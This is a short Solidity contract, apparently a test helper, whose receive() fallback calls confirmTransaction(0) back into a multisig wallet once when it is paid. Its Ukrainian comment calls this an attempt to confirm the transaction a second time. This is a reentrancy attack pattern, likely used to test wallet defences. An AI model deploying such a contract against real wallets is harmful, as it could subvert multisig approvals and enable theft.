// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IWallet {
    function confirmTransaction(uint256) external;
}

contract MaliciousReceiver {
    address public wallet;
    bool internal attackOnce;

    function initWallet(address _wallet) external {
        wallet = _wallet;
    }

    // Fallback, який намагається підтвердити транзакцію повторно
    receive() external payable {
        if (!attackOnce) {
            attackOnce = true;
            IWallet(wallet).confirmTransaction(0);
        }
    }
}
